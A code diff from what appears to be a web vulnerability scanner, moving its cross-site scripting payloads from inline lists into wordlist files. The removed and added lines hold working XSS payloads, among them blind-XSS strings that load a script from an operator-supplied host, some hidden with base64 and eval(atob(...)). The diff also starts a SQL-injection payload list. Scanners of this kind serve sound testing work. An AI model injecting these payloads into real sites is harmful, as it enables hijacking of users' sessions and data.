@@ -7,18 +7,17 @@ from base64 import b64encode
 
 class XSS:
     def __init__(self,host=None):
-        self.payloads=['">ScanT3r<svg/onload=confirm(/ScanT3r/)>web"','"><img src=x OnMouseEnter=(confirm)(1)>ScanT3r','"><div onpointermove="alert(45)">MOVE HERE</div>','<x/oncopy=brrrr>x']
         self.blind = list()
+        self.payloads = list()
+        f = open('wordlists/xss.txt','r')
+        for p in f:
+            self.payloads.append(p.rstrip())
+        f.close()
         if host:
-            b = b64encode(f'var a=document.createElement("script");a.src="{host}";document.body.appendChild(a);'.encode('utf-8')).decode('utf-8').replace('=','')
-            self.payloads.append(f'"><script src={host}></script>')
-            self.payloads.append(r"javascript:eval('var a=document.createElement(\'script\');a.src=\'{host}\';document.body.appendChild(a)')".format(host=host))
-            self.payloads.append(f'"><img src=x id={b}&#61; onerror=eval(atob(this.id))>')
-            self.payloads.append(f'"><input onfocus=eval(atob(this.id)) id={b}&#61; autofocus>')
-            self.blind.append(f'"><script src={host}></script>')
-            self.blind.append(r"javascript:eval('var a=document.createElement(\'script\');a.src=\'{host}\';document.body.appendChild(a)')".format(host=host))
-            self.blind.append(f'"><img src=x id={b}&#61; onerror=eval(atob(this.id))>')
-            self.blind.append(f'"><input onfocus=eval(atob(this.id)) id={b}&#61; autofocus>')
+            f = open('wordlists/bxss.txt','r')
+            b64_host = b64encode(f'var a=document.createElement("script");a.src="{host}";document.body.appendChild(a);'.encode('utf-8')).decode('utf-8').replace('=','')
+            for p in f:
+                self.blind.append(p.rstrip().format(b64_host=b64_host).replace('{host}',host))
 sqli_payloads=[
     '"',
     "'",
